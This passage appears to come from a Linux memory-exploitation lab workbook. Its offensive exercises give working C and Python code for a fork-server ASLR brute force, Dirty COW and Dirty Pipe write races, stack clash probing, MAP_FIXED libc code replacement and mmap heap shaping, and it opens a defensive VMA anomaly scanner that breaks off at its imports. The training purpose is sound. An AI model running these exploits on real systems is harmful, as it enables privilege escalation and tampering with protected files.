        if b"WIN" in resp or b"OK" in resp:
            successes += 1
    except Exception:
        pass

    if attempts % 5 == 0:
        log.info(f"Attempt {attempts}/{MAX_ATTEMPTS}")

log.info(f"Results: {successes}/{attempts} successful connections")
log.info(f"Check /tmp/pwned.txt for exploitation proof")

# Verify
import os
if os.path.exists("/tmp/pwned.txt"):
    with open("/tmp/pwned.txt") as f:
        log.success(f"PROOF: {f.read().strip()}")
    os.unlink("/tmp/pwned.txt")
else:
    log.warning("No proof file — adjust offset or address")
```

```bash
# Compile and start the server
gcc -o fork_server fork_no_exec_server.c -fno-stack-protector -no-pie -g
./fork_server &

# Note the win_function address from server output
# Then brute-force
python3 brute_force_fork.py 0x401196  # use actual address from output
```

**Verification:**
- [ ] `aslr_fork_demo` proves all children share identical address layout
- [ ] Non-PIE server's `win_function` has a fixed address across restarts
- [ ] Brute-force script redirects execution to `win_function`
- [ ] `/tmp/pwned.txt` confirms successful exploitation

---

### Exercise 4: Stack Clash Exploitation (CVE-2017-1000364)

**Objective:** Understand and demonstrate the stack clash vulnerability — how a large stack allocation can skip the guard page and land in an adjacent memory region.

#### Step 1: Observe the stack guard gap

```bash
# Check kernel's stack guard gap (mitigated systems: 256 pages = 1 MB)
cat /proc/sys/vm/stack_guard_gap
# Expected: 256 (or larger)

# Visualize the gap between stack and adjacent mmap region
cat /proc/self/maps | grep -E '\[stack\]|7f[0-9a-f]+ .* /usr/lib'
# You should see a gap between the last library mapping and [stack]
```

#### Step 2: Build the demonstration

```c
/* stack_clash_analysis.c — analyze stack guard behavior.
 * Does NOT perform actual exploitation (patched kernels prevent it).
 * Instead, demonstrates the mechanism and verifies mitigations.
 *
 * Compile: gcc -o stack_clash stack_clash_analysis.c
 *          -fno-stack-clash-protection (to see unprotected behavior)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/resource.h>

static jmp_buf jump_buf;
static volatile sig_atomic_t fault_caught = 0;

void segv_handler(int sig) {
    fault_caught = 1;
    longjmp(jump_buf, 1);
}

void check_stack_vs_mmap(void) {
    int stack_var;
    unsigned long stack_addr = (unsigned long)&stack_var;

    printf("\n[*] Stack analysis:\n");
    printf("  Current stack pointer: %p\n", (void *)&stack_var);

    /* Read /proc/self/maps to find the stack VMA and adjacent regions */
    FILE *maps = fopen("/proc/self/maps", "r");
    if (!maps) return;

    char line[512];
    unsigned long stack_start = 0, stack_end = 0;
    unsigned long prev_end = 0;
    char prev_name[256] = "";
    unsigned long gap_before_stack = 0;

    while (fgets(line, sizeof(line), maps)) {
        unsigned long start, end;
        char perms[8], name[256] = "";
        if (sscanf(line, "%lx-%lx %7s %*s %*s %*s %255[^\n]",
                   &start, &end, perms, name) >= 3) {
            if (strstr(name, "[stack]")) {
                stack_start = start;
                stack_end = end;
                gap_before_stack = start - prev_end;
            }
            prev_end = end;
            strncpy(prev_name, name, sizeof(prev_name) - 1);
        }
    }
    fclose(maps);

    if (stack_start) {
        printf("  Stack VMA: %lx-%lx (%lu KB)\n",
               stack_start, stack_end, (stack_end - stack_start) / 1024);
        printf("  Gap before stack: %lu bytes (%lu KB = %lu pages)\n",
               gap_before_stack, gap_before_stack / 1024,
               gap_before_stack / 4096);

        unsigned long guard_gap;
        FILE *gg = fopen("/proc/sys/vm/stack_guard_gap", "r");
        if (gg) {
            fscanf(gg, "%lu", &guard_gap);
            fclose(gg);
            printf("  Kernel stack_guard_gap: %lu pages (%lu KB)\n",
                   guard_gap, guard_gap * 4);

            if (gap_before_stack >= guard_gap * 4096) {
                printf("  [OK] Gap >= guard_gap — stack clash mitigated\n");
            } else {
                printf("  [WARN] Gap < guard_gap — vulnerable!\n");
            }
        }
    }
}

void test_large_alloca(size_t size) {
    printf("\n[*] Testing alloca(%zu) = %zu KB = %zu pages\n",
           size, size / 1024, size / 4096);

    struct sigaction sa = {.sa_handler = segv_handler};
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    fault_caught = 0;

    if (setjmp(jump_buf) == 0) {
        volatile char *p = alloca(size);
        /* Touch the bottom of the allocation */
        *p = 'X';
        printf("  alloca returned: %p\n", (void *)p);
        printf("  Bottom byte written successfully\n");

        /* Probe each page from top to bottom */
        size_t pages_ok = 0;
        for (size_t offset = 0; offset < size; offset += 4096) {
            if (setjmp(jump_buf) == 0) {
                p[offset] = 'A';
                pages_ok++;
            } else {
                printf("  FAULT at offset %zu (%zu pages from top)\n",
                       offset, offset / 4096);
                break;
            }
        }
        printf("  Pages accessible: %zu / %zu\n", pages_ok, size / 4096);
    } else {
        printf("  SIGSEGV caught — guard page hit or access violation\n");
        printf("  [MITIGATED] Kernel prevented stack clash\n");
    }
}

void check_compiler_protection(void) {
    printf("\n[*] Checking compiler stack clash protection:\n");

    /* Check if the binary was compiled with -fstack-clash-protection
       by looking for page-probing instructions in the binary itself */
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
             "objdump -d /proc/%d/exe 2>/dev/null | "
             "grep -c 'or.*%%rsp\\|sub.*0x1000.*%%rsp' || true",
             getpid());
    printf("  Stack probe instructions (page-granular sub+touch): ");
    fflush(stdout);
    system(cmd);
}

int main(void) {
    printf("=== Stack Clash Analysis (CVE-2017-1000364) ===\n");
    printf("Kernel: ");
    fflush(stdout);
    system("uname -r");

    check_stack_vs_mmap();
    check_compiler_protection();

    /* Test increasing alloca sizes */
    test_large_alloca(4096);           /* 1 page — always safe */
    test_large_alloca(4096 * 4);       /* 4 pages — within old guard */
    test_large_alloca(4096 * 256);     /* 1 MB — at guard gap boundary */
    test_large_alloca(4096 * 512);     /* 2 MB — past guard gap */

    printf("\n=== Mitigation Verification ===\n");
    printf("[*] Check stack_guard_gap: ");
    fflush(stdout);
    system("cat /proc/sys/vm/stack_guard_gap");

    printf("[*] Check compiler flag: ");
    fflush(stdout);
    system("gcc -v -x c -E /dev/null 2>&1 | grep -o 'stack-clash' || "
           "echo 'not in default flags'");

    printf("[*] Check VMAP_STACK: ");
    fflush(stdout);
    system("grep CONFIG_VMAP_STACK /boot/config-$(uname -r) 2>/dev/null || "
           "echo 'config not found'");

    return 0;
}
```

```bash
# Compile WITHOUT stack clash protection (to see the mechanism)
gcc -o stack_clash stack_clash_analysis.c \
    -fno-stack-clash-protection -g

./stack_clash

# Compile WITH stack clash protection (to verify mitigation)
gcc -o stack_clash_protected stack_clash_analysis.c \
    -fstack-clash-protection -g

./stack_clash_protected
```

**Expected output on patched kernel:**
```
=== Stack Clash Analysis (CVE-2017-1000364) ===
Kernel: 5.15.0-91-generic

[*] Stack analysis:
  Stack VMA: 7ffd12345000-7ffd12b66000 (8324 KB)
  Gap before stack: 1052672 bytes (1028 KB = 257 pages)
  Kernel stack_guard_gap: 256 pages (1024 KB)
  [OK] Gap >= guard_gap — stack clash mitigated

[*] Testing alloca(4096) = 4 KB = 1 pages
  alloca returned: 0x7ffd12b64f00
  Pages accessible: 1 / 1

[*] Testing alloca(1048576) = 1024 KB = 256 pages
  SIGSEGV caught — guard page hit or access violation
  [MITIGATED] Kernel prevented stack clash
```

**Verification:**
- [ ] `stack_guard_gap` is >= 256 pages on patched kernels
- [ ] Large `alloca` triggers SIGSEGV on patched kernels
- [ ] `CONFIG_VMAP_STACK=y` is set in kernel config
- [ ] Compiler emits probe instructions with `-fstack-clash-protection`

---

### Exercise 5: Dirty COW Race Condition Analysis (CVE-2016-5195)

**Objective:** Understand the Dirty COW race condition mechanism through a safe, instrumented demonstration on **patched** kernels. Analyze the race between `write(/proc/self/mem)` and `madvise(MADV_DONTNEED)`.

> **IMPORTANT:** This exercise runs on patched kernels (4.8.3+) where the race has no effect. The purpose is understanding the mechanism and building detection, not performing the exploit.

#### Step 1: Build the race condition demonstrator

```c
/* dirtycow_analyzer.c — instrumented Dirty COW race mechanism analysis.
 * On patched kernels (>= 4.8.3), the race has no effect — the kernel's
 * FOLL_COW/FOLL_FORCE check prevents the write to the shared page.
 *
 * This program creates a test file, attempts the race, and reports
 * whether the kernel is vulnerable.
 *
 * Compile: gcc -o dirtycow_analyzer dirtycow_analyzer.c -lpthread -g
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>
#include <sys/time.h>

#define TEST_FILE "/tmp/dirtycow_test_file"
#define ORIGINAL_CONTENT "AAAAAAAAAAAAAAAA"
#define ATTACK_CONTENT   "BBBBBBBBBBBBBBBB"
#define RACE_ITERATIONS  100000

struct race_ctx {
    void    *map;
    size_t   map_size;
    off_t    target_offset;
    char    *payload;
    size_t   payload_len;
    volatile int stop;
    unsigned long madvise_count;
    unsigned long write_count;
};

void *madvise_thread(void *arg) {
    struct race_ctx *ctx = arg;
    while (!ctx->stop) {
        madvise(ctx->map, ctx->map_size, MADV_DONTNEED);
        ctx->madvise_count++;
    }
    return NULL;
}

void *write_thread(void *arg) {
    struct race_ctx *ctx = arg;

    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        perror("open /proc/self/mem");
        return NULL;
    }

    while (!ctx->stop) {
        lseek(fd, (off_t)((char *)ctx->map + ctx->target_offset), SEEK_SET);
        write(fd, ctx->payload, ctx->payload_len);
        ctx->write_count++;
    }

    close(fd);
    return NULL;
}

int main(void) {
    printf("=== Dirty COW Race Condition Analyzer (CVE-2016-5195) ===\n\n");

    /* Report kernel version */
    printf("[*] Kernel: ");
    fflush(stdout);
    system("uname -r");

    /* Check if kernel is patched */
    printf("[*] Kernel version check: ");
    FILE *ver = popen("uname -r | awk -F'[.-]' '{print $1*1000000+$2*1000+$3}'",
                      "r");
    if (ver) {
        int kernel_num;
        fscanf(ver, "%d", &kernel_num);
        pclose(ver);
        if (kernel_num >= 4008003) {
            printf("PATCHED (>= 4.8.3) — race will have no effect\n");
        } else {
            printf("POTENTIALLY VULNERABLE (< 4.8.3)\n");
            printf("    WARNING: On vulnerable kernels, this could modify "
                   "the test file.\n");
        }
    }

    /* Step 1: Create test file */
    printf("\n[*] Creating test file: %s\n", TEST_FILE);
    FILE *f = fopen(TEST_FILE, "w");
    if (!f) { perror("fopen"); return 1; }
    fprintf(f, "%s\n", ORIGINAL_CONTENT);
    fclose(f);

    /* Make it read-only */
    chmod(TEST_FILE, 0444);
    printf("[*] File permissions set to 0444 (read-only)\n");
    printf("[*] Original content: %s\n", ORIGINAL_CONTENT);

    /* Step 2: mmap the file as MAP_PRIVATE (COW) */
    int fd = open(TEST_FILE, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    struct stat st;
    fstat(fd, &st);

    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); return 1; }
    close(fd);

    printf("[*] File mapped at: %p (MAP_PRIVATE, PROT_READ)\n", map);

    /* Step 3: Run the race */
    printf("\n[*] Starting race threads (%d iterations target)...\n",
           RACE_ITERATIONS);

    struct race_ctx ctx = {
        .map = map,
        .map_size = st.st_size,
        .target_offset = 0,
        .payload = ATTACK_CONTENT,
        .payload_len = strlen(ATTACK_CONTENT),
        .stop = 0,
        .madvise_count = 0,
        .write_count = 0,
    };

    struct timeval t_start, t_end;
    gettimeofday(&t_start, NULL);

    pthread_t t_madvise, t_write;
    pthread_create(&t_madvise, NULL, madvise_thread, &ctx);
    pthread_create(&t_write, NULL, write_thread, &ctx);

    /* Run for a bounded time */
    usleep(500000);  /* 500ms */
    ctx.stop = 1;

    pthread_join(t_madvise, NULL);
    pthread_join(t_write, NULL);

    gettimeofday(&t_end, NULL);
    double elapsed = (t_end.tv_sec - t_start.tv_sec) +
                     (t_end.tv_usec - t_start.tv_usec) / 1e6;

    printf("[*] Race completed in %.2f seconds\n", elapsed);
    printf("[*] madvise calls: %lu\n", ctx.madvise_count);
    printf("[*] write calls:   %lu\n", ctx.write_count);

    /* Step 4: Check the result */
    munmap(map, st.st_size);

    printf("\n[*] Checking file content after race:\n");
    f = fopen(TEST_FILE, "r");
    if (f) {
        char result[256];
        if (fgets(result, sizeof(result), f)) {
            char *nl = strchr(result, '\n');
            if (nl) *nl = '\0';
            printf("[*] Content: %s\n", result);

            if (strcmp(result, ORIGINAL_CONTENT) == 0) {
                printf("[PATCHED] File unchanged — kernel prevented the race\n");
            } else if (strcmp(result, ATTACK_CONTENT) == 0) {
                printf("[VULNERABLE] File was modified! Dirty COW succeeded!\n");
                /* Restore the file */
                fclose(f);
                f = fopen(TEST_FILE, "w");
                if (f) { fprintf(f, "%s\n", ORIGINAL_CONTENT); }
            } else {
                printf("[PARTIAL] File partially modified: corruption detected\n");
            }
        }
        fclose(f);
    }

    /* Cleanup */
    unlink(TEST_FILE);

    printf("\n=== Detection Indicators ===\n");
    printf("An active Dirty COW attack produces:\n");
    printf("  - High-frequency madvise(MADV_DONTNEED) calls\n");
    printf("  - /proc/self/mem opened for writing\n");
    printf("  - File integrity changes with no write() syscall on the file\n");
    printf("  - See Part B Exercise 3 for detection rules\n");

    return 0;
}
```

```bash
gcc -o dirtycow_analyzer dirtycow_analyzer.c -lpthread -g
./dirtycow_analyzer
```

**Verification:**
- [ ] On kernels >= 4.8.3, output shows `[PATCHED] File unchanged`
- [ ] Race statistics show high madvise/write throughput
- [ ] Detection indicators are identified

---

### Exercise 6: Dirty Pipe Exploitation Analysis (CVE-2022-0847)

**Objective:** Understand the Dirty Pipe vulnerability — how `splice()` combined with the `PIPE_BUF_FLAG_CAN_MERGE` flag allows writing to page-cache-backed files. Build a safe demonstration on patched kernels.

> **Note:** Dirty Pipe affects kernels 5.8–5.16.11. Most current systems are patched.

#### Step 1: Build an instrumented Dirty Pipe analyzer

```c
/* dirty_pipe_analyzer.c — analyze CVE-2022-0847 mechanism.
 * On patched kernels, splice() correctly clears PIPE_BUF_FLAG_CAN_MERGE,
 * so the write to the page cache does not occur.
 *
 * Compile: gcc -o dirty_pipe_analyzer dirty_pipe_analyzer.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#define TEST_FILE "/tmp/dirty_pipe_test"
#define ORIGINAL "ORIGINAL_CONTENT_HERE_DO_NOT_MODIFY\n"
#define PAYLOAD  "PWNED_BY_DIRTY_PIPE"

int check_kernel_vuln(void) {
    FILE *f = popen("uname -r", "r");
    if (!f) return -1;
    char ver[64];
    fgets(ver, sizeof(ver), f);
    pclose(f);

    int major, minor, patch;
    sscanf(ver, "%d.%d.%d", &major, &minor, &patch);

    printf("[*] Kernel: %d.%d.%d\n", major, minor, patch);

    if (major < 5 || (major == 5 && minor < 8)) {
        printf("[*] Status: NOT AFFECTED (pre-5.8 — bug not present)\n");
        return 0;
    }
    if (major == 5 && minor <= 16 && patch <= 11) {
        printf("[*] Status: POTENTIALLY VULNERABLE (5.8-5.16.11)\n");
        return 1;
    }
    printf("[*] Status: PATCHED (>= 5.16.12)\n");
    return 0;
}

int attempt_dirty_pipe(const char *target, off_t offset,
                       const char *data, size_t len) {
    /* Step 1: Open the target file (read-only is sufficient) */
    int fd = open(target, O_RDONLY);
    if (fd < 0) { perror("open target"); return -1; }

    /* Step 2: Create a pipe */
    int pipefd[2];
    if (pipe(pipefd) < 0) { perror("pipe"); close(fd); return -1; }

    /* Get pipe capacity */
    int pipe_sz = fcntl(pipefd[1], F_GETPIPE_SZ);
    printf("[*] Pipe capacity: %d bytes\n", pipe_sz);

    /* Step 3: Fill the pipe completely to set CAN_MERGE flag
       on all pipe_buffer entries */
    char *fill = malloc(pipe_sz);
    memset(fill, 'X', pipe_sz);
    write(pipefd[1], fill, pipe_sz);
    printf("[*] Pipe filled (%d bytes) — CAN_MERGE flag set on buffers\n",
           pipe_sz);

    /* Step 4: Drain the pipe completely — buffers stay with flag set */
    read(pipefd[0], fill, pipe_sz);
    free(fill);
    printf("[*] Pipe drained — buffers retain CAN_MERGE flag\n");

    /* Step 5: Splice 1 byte from the target file into the pipe.
       This puts a page-cache page into the pipe buffer.
       On VULNERABLE kernels: CAN_MERGE flag is NOT cleared.
       On PATCHED kernels: buf->flags = 0 clears CAN_MERGE. */
    off_t splice_off = offset & ~0xFFFUL;
    printf("[*] Splicing 1 byte from file offset %ld (page %ld)...\n",
           (long)splice_off, (long)(splice_off / 4096));

    ssize_t n = splice(fd, &splice_off, pipefd[1], NULL, 1, 0);
    if (n <= 0) {
        perror("splice");
        close(fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }
    printf("[*] Spliced %zd byte(s) into pipe\n", n);

    /* Step 6: Write our payload to the pipe.
       On VULNERABLE kernels: write goes into the page cache
       (because CAN_MERGE is set).
       On PATCHED kernels: write goes to a new pipe buffer page. */
    size_t in_page = offset % 4096;
    size_t pad = in_page > 1 ? in_page - 1 : 0;

    if (pad > 0) {
        char *padding = calloc(1, pad);
        write(pipefd[1], padding, pad);
        free(padding);
    }

    write(pipefd[1], data, len);
    printf("[*] Wrote %zu bytes at in-page offset %zu\n", len, in_page);

    close(fd);
    close(pipefd[0]);
    close(pipefd[1]);

    return 0;
}

int main(void) {
    printf("=== Dirty Pipe Analyzer (CVE-2022-0847) ===\n\n");

    int vuln = check_kernel_vuln();

    /* Create test file */
    printf("\n[*] Creating test file: %s\n", TEST_FILE);
    FILE *f = fopen(TEST_FILE, "w");
    fprintf(f, "%s", ORIGINAL);
    fclose(f);
    chmod(TEST_FILE, 0444);

    printf("[*] Original: %s", ORIGINAL);

    /* Attempt the exploit at offset 1 (must be non-page-aligned) */
    printf("\n[*] Attempting Dirty Pipe write at offset 1...\n");
    attempt_dirty_pipe(TEST_FILE, 1, PAYLOAD, strlen(PAYLOAD));

    /* Check result */
    printf("\n[*] File content after attempt:\n");
    f = fopen(TEST_FILE, "r");
    if (f) {
        char result[256];
        fgets(result, sizeof(result), f);
        fclose(f);
        printf("    %s\n", result);

        if (strstr(result, PAYLOAD)) {
            printf("[VULNERABLE] Dirty Pipe succeeded — file was modified!\n");
        } else if (strncmp(result, ORIGINAL, strlen(ORIGINAL) - 1) == 0) {
            printf("[PATCHED] File unchanged — kernel cleared CAN_MERGE\n");
        }
    }

    unlink(TEST_FILE);

    printf("\n=== Comparison: Dirty COW vs Dirty Pipe ===\n");
    printf("%-25s %-25s %-25s\n", "Aspect", "Dirty COW", "Dirty Pipe");
    printf("%-25s %-25s %-25s\n", "Bug class", "COW race condition", "Missing flag init");
    printf("%-25s %-25s %-25s\n", "Reliability", "Probabilistic (race)", "Deterministic (100%%)");
    printf("%-25s %-25s %-25s\n", "Kernels", "2.6.22-4.8.3", "5.8-5.16.11");
    printf("%-25s %-25s %-25s\n", "Mechanism", "page table via COW", "page cache via pipe");
    printf("%-25s %-25s %-25s\n", "Detection", "madvise(DONTNEED) freq", "splice+pipe write");

    return 0;
}
```

```bash
gcc -o dirty_pipe_analyzer dirty_pipe_analyzer.c
./dirty_pipe_analyzer
```

**Verification:**
- [ ] Kernel version check correctly identifies patched/vulnerable status
- [ ] On patched kernels, file content is unchanged after the attempt
- [ ] The splice → pipe write mechanism is clearly demonstrated
- [ ] Comparison table between Dirty COW and Dirty Pipe is displayed

---

### Exercise 7: MAP_FIXED Library Replacement Attack

**Objective:** Demonstrate how `MAP_FIXED` can silently replace a loaded library's `.text` section with attacker-controlled code within the same process.

```c
/* mapfixed_attack.c — replace a loaded library page with MAP_FIXED.
 * This runs within the attacker's own process.
 * Demonstrates the technique + the detection artifacts it creates.
 *
 * Compile: gcc -o mapfixed_attack mapfixed_attack.c -ldl
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <stdint.h>
#include <unistd.h>

void dump_maps_region(uintptr_t addr) {
    FILE *maps = fopen("/proc/self/maps", "r");
    if (!maps) return;
    char line[512];
    while (fgets(line, sizeof(line), maps)) {
        unsigned long start, end;
        if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
            if (addr >= start && addr < end) {
                printf("  %s", line);
            }
        }
    }
    fclose(maps);
}

int main(void) {
    printf("=== MAP_FIXED Library Replacement Attack ===\n\n");

    /* Step 1: Find a libc function's address */
    void *target_fn = dlsym(NULL, "getenv");
    if (!target_fn) {
        fprintf(stderr, "dlsym failed\n");
        return 1;
    }
    printf("[*] Target function (getenv): %p\n", target_fn);

    /* Step 2: Show the original mapping */
    uintptr_t page_addr = (uintptr_t)target_fn & ~0xFFFUL;
    printf("[*] Page containing getenv: %p\n", (void *)page_addr);
    printf("[*] Original mapping:\n");
    dump_maps_region(page_addr);

    /* Step 3: Read original bytes */
    unsigned char orig_bytes[16];
    memcpy(orig_bytes, target_fn, sizeof(orig_bytes));
    printf("[*] Original bytes at getenv: ");
    for (int i = 0; i < 16; i++) printf("%02x ", orig_bytes[i]);
    printf("\n");

    /* Step 4: Replace the page with MAP_FIXED */
    printf("\n[*] Replacing page with MAP_FIXED...\n");
    void *p = mmap((void *)page_addr, 4096,
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                   -1, 0);
    if (p == MAP_FAILED) {
        perror("mmap MAP_FIXED");
        return 1;
    }
    printf("[*] MAP_FIXED succeeded at %p\n", p);

    /* Step 5: Fill with RET instructions (0xC3) */
    memset(p, 0xC3, 4096);  /* RET sled */
    printf("[*] Page filled with RET (0xC3) instructions\n");

    /* Step 6: Show the anomalous mapping */
    printf("[*] Anomalous mapping (after replacement):\n");
    dump_maps_region(page_addr);
    printf("    ^^^ Note: anonymous (no filename), rwx permissions\n");
    printf("    This is the detection artifact — a gap in the library mapping\n");

    /* Step 7: Call getenv — it now hits our RET sled */
    printf("\n[*] Calling getenv(\"PATH\")...\n");
    char *result = getenv("PATH");
    printf("[*] getenv returned: %p\n", (void *)result);
    printf("[*] (On a real system, this would be garbage or NULL because\n"
           "     getenv's code has been replaced with RET instructions)\n");

    /* Step 8: Show full maps for anomaly analysis */
    printf("\n[*] Full /proc/self/maps excerpt (libc region):\n");
    FILE *maps = fopen("/proc/self/maps", "r");
    if (maps) {
        char line[512];
        while (fgets(line, sizeof(line), maps)) {
            if (strstr(line, "libc") || strstr(line, "00:00 0")) {
                /* Show anonymous and libc entries */
                unsigned long s, e;
                if (sscanf(line, "%lx-%lx", &s, &e) == 2) {
                    if (s >= page_addr - 0x200000 && s <= page_addr + 0x200000) {
                        printf("  %s", line);
                    }
                }
            }
        }
        fclose(maps);
    }

    printf("\n=== Detection Artifacts ===\n");
    printf("1. Anonymous mapping (inode=0, no path) with rwx permissions\n");
    printf("2. Gap in libc's file-backed mapping sequence\n");
    printf("3. Offset discontinuity in adjacent libc VMAs\n");
    printf("4. The VMA anomaly scanner (Part B) flags all three\n");

    return 0;
}
```

```bash
gcc -o mapfixed_attack mapfixed_attack.c -ldl -g
./mapfixed_attack
```

**Verification:**
- [ ] `getenv` page is successfully replaced with a RET sled
- [ ] `/proc/self/maps` shows an anonymous rwx region where libc was
- [ ] The adjacent libc mappings show an offset discontinuity
- [ ] Calling `getenv()` after replacement returns NULL/garbage

---

### Exercise 8: Heap Shaping via mmap/munmap

**Objective:** Demonstrate controlled address space manipulation using mmap/munmap cycles to achieve predictable memory layout for exploitation. Show how `MADV_DONTNEED` enables page recycling.

```c
/* heap_shape_lab.c — shape the mmap region for predictable layout.
 * Demonstrates:
 *   1. Creating and filling address holes
 *   2. LIFO behavior of the mmap gap search
 *   3. MADV_DONTNEED for zero-fill page recycling
 *   4. Adjacency control for overflow simulation
 *
 * Compile: gcc -o heap_shape heap_shape_lab.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define SLOT_SIZE 0x1000  /* 4 KB */
#define NUM_SLOTS 32

void print_slot_layout(void **slots, int n) {
    printf("\n  Slot Layout (sorted by address):\n");
    /* Collect non-NULL slots */
    typedef struct { int idx; void *addr; } entry;
    entry entries[NUM_SLOTS];
    int count = 0;
    for (int i = 0; i < n; i++) {
        if (slots[i]) {
            entries[count++] = (entry){i, slots[i]};
        }
    }
    /* Sort by address */
    for (int i = 0; i < count - 1; i++) {
        for (int j = i + 1; j < count; j++) {
            if (entries[j].addr < entries[i].addr) {
                entry tmp = entries[i];
                entries[i] = entries[j];
                entries[j] = tmp;
            }
        }
    }
    for (int i = 0; i < count; i++) {
        char adjacent = ' ';
        if (i > 0) {
            ptrdiff_t gap = (char *)entries[i].addr -
                           (char *)entries[i-1].addr - SLOT_SIZE;
            if (gap == 0) adjacent = '+';  /* adjacent */
        }
        printf("  %c slot[%2d] = %p\n",
               adjacent, entries[i].idx, entries[i].addr);
    }
}

int main(void) {
    void *slots[NUM_SLOTS] = {0};

    printf("=== Heap Shaping via mmap/munmap ===\n");

    /* Phase 1: Allocate contiguous block */
    printf("\n[Phase 1] Allocating %d x %d KB slots...\n",
           NUM_SLOTS, SLOT_SIZE / 1024);
    for (int i = 0; i < NUM_SLOTS; i++) {
        slots[i] = mmap(NULL, SLOT_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (slots[i] == MAP_FAILED) {
            perror("mmap");
            return 1;
        }
        /* Tag each slot for identification */
        memset(slots[i], 'A' + (i % 26), SLOT_SIZE);
    }
    print_slot_layout(slots, NUM_SLOTS);

    /* Phase 2: Free alternating slots to create holes */
    printf("\n[Phase 2] Freeing even-numbered slots (creating holes)...\n");
    for (int i = 0; i < NUM_SLOTS; i += 2) {
        munmap(slots[i], SLOT_SIZE);
        slots[i] = NULL;
    }
    print_slot_layout(slots, NUM_SLOTS);

    /* Phase 3: Allocate a "victim" — observe which hole it fills */
    printf("\n[Phase 3] Allocating victim (should fill a hole)...\n");
    void *victim = mmap(NULL, SLOT_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("  victim = %p\n", victim);

    /* Check adjacency */
    for (int i = 1; i < NUM_SLOTS; i += 2) {
        if (slots[i]) {
            ptrdiff_t delta = (char *)victim - (char *)slots[i];
            if (abs(delta) == SLOT_SIZE) {
                printf("  ADJACENT to slot[%d] (%p), delta = %+td bytes\n",
                       i, slots[i], delta);
                printf("  -> An overflow from slot[%d] reaches victim!\n", i);
            }
        }
    }

    /* Phase 4: MADV_DONTNEED for page recycling */
    printf("\n[Phase 4] MADV_DONTNEED demonstration...\n");
    void *recycle = mmap(NULL, SLOT_SIZE, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(recycle, 0xFF, SLOT_SIZE);
    printf("  Before MADV_DONTNEED: first byte = 0x%02x\n",
           *(unsigned char *)recycle);

    madvise(recycle, SLOT_SIZE, MADV_DONTNEED);
    /* After MADV_DONTNEED on anonymous mapping: pages are zeroed */
    printf("  After MADV_DONTNEED:  first byte = 0x%02x\n",
           *(unsigned char *)recycle);
    printf("  -> Pages zeroed without munmap — VMA preserved, address stable\n");

    /* Phase 5: Demonstrate controlled re-use */
    printf("\n[Phase 5] Controlled re-fill after MADV_DONTNEED...\n");
    /* Fill with a fake structure */
    struct fake_metadata {
        unsigned long func_ptr;
        unsigned long data_ptr;
        char name[32];
    };
    struct fake_metadata *meta = (struct fake_metadata *)recycle;
    meta->func_ptr = 0xDEADBEEFCAFEBABE;
    meta->data_ptr = 0x4141414141414141;
    strncpy(meta->name, "controlled_data", sizeof(meta->name));
    printf("  Placed fake structure at %p:\n", recycle);
    printf("    func_ptr = %lx\n", meta->func_ptr);
    printf("    data_ptr = %lx\n", meta->data_ptr);
    printf("    name     = %s\n", meta->name);

    /* Cleanup */
    for (int i = 0; i < NUM_SLOTS; i++) {
        if (slots[i]) munmap(slots[i], SLOT_SIZE);
    }
    munmap(victim, SLOT_SIZE);
    munmap(recycle, SLOT_SIZE);

    printf("\n=== Key Takeaways ===\n");
    printf("1. mmap/munmap cycles create predictable address-space holes\n");
    printf("2. Kernel's top-down search fills recently freed holes (LIFO)\n");
    printf("3. MADV_DONTNEED zeroes pages without changing the VMA\n");
    printf("4. Attacker controls adjacency for overflow exploitation\n");

    return 0;
}
```

```bash
gcc -o heap_shape heap_shape_lab.c -g
./heap_shape
```

**Verification:**
- [ ] Alternating munmap creates visible holes in the slot layout
- [ ] Victim allocation fills a hole adjacent to a controlled slot
- [ ] `MADV_DONTNEED` zeroes anonymous pages without unmapping
- [ ] Adjacency between controlled and victim allocations is demonstrated

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 1: VMA Anomaly Detection Engine

**Objective:** Build a comprehensive Python tool that scans `/proc/PID/maps` for exploitation indicators: W+X mappings, anonymous exec regions, MAP_FIXED artifacts, heap spray patterns, stack anomalies, and library integrity gaps.

```python
#!/usr/bin/env python3
"""vma_sentinel.py — VMA anomaly detection engine.

Scans /proc/PID/maps for exploitation indicators:
  - W+X (writable + executable) mappings
  - Anonymous executable regions (shellcode staging)
  - Library mapping gaps (MAP_FIXED replacement)
  - Heap spray patterns (many same-size anonymous regions)
  - Stack address anomalies
  - Permission transition anomalies
  - Excessive VMA count (DoS/spray indicator)
  - vDSO/vvar position anomalies

Usage:
  python3 vma_sentinel.py <pid>           # Scan single process
  python3 vma_sentinel.py --all           # Scan all accessible processes
  python3 vma_sentinel.py --watch <pid>   # Continuous monitoring
  python3 vma_sentinel.py --json <pid>    # JSON output for SIEM ingestion
"""
import sys
import os
import re
import json
import time
import argparse
from collections import Counter, defaultdict
from datetime import datetime, timezone

